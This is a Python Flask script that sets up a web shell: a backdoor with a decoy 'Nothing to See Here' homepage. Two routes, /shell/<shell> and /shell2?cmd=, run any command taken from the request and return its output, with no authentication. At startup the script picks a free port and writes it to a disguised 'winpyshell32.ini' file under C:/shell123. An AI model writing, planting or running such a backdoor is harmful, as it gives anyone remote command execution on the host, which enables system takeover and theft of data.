from flask import Flask
from flask import request

app = Flask(__name__)

@app.route("/")
def hello_world():
    return "<p>Nothing to See Here</p>"
      
@app.route("/shell/<shell>")
def shell(shell):
    import os
    import subprocess
    output = subprocess.getoutput(shell)
    return output

@app.route("/shell2")
def shell2():
    import os
    import subprocess
    command = request.args.get('cmd', '')
    output2 = subprocess.getoutput(command)
    return output2

if __name__ == '__main__':
   Port = 5000
   endloop = 0
   import socket
   import configparser
   import os
   dirchk = os.path.isdir("C:/shell123")
   if dirchk == False:
     os.mkdir("C:/shell123")

   while (endloop < 1):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex(('127.0.0.1',Port))
    # print(result)
    if result == 10061 or 0:
     print("Port",Port,"is open")
     endloop = 1
    else:
     print("Port",Port,"is not open")
     Port = Port + 1
   sock.close()
   
   config_file = configparser.ConfigParser()

   config_file.add_section("winpyshell32")

   config_file.set("winpyshell32", "PortNum", f"{Port}")

   with open(r"C:/shell123/winpyshell32.ini", 'w') as configfileObj:
    config_file.write(configfileObj)
    configfileObj.flush()
    configfileObj.close()


   app.run(debug=False, port=Port)